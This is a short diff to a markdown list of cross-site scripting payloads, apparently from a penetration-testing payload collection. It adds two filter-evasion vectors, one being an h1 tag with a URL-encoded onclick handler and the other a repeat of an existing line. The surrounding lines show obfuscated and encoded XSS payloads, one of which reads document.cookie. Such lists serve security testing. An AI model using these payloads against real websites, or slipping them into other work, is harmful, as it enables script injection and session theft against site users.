@@ -216,6 +216,8 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   "/><svg onauxclick=&#x63&#x6F&#x5C&#x75&#x30&#x30&#x36&#x65&#x66&#x69&#x72&#x6D(\1\)>
   "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
   <svg><animate%20onend=alert(document.cookie)%20attributeName=x%20dur=1s>
+  <h1/%6f%6e/oNclicK=`alert`hacked>APTH
+  "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
   ```
 </details>
 
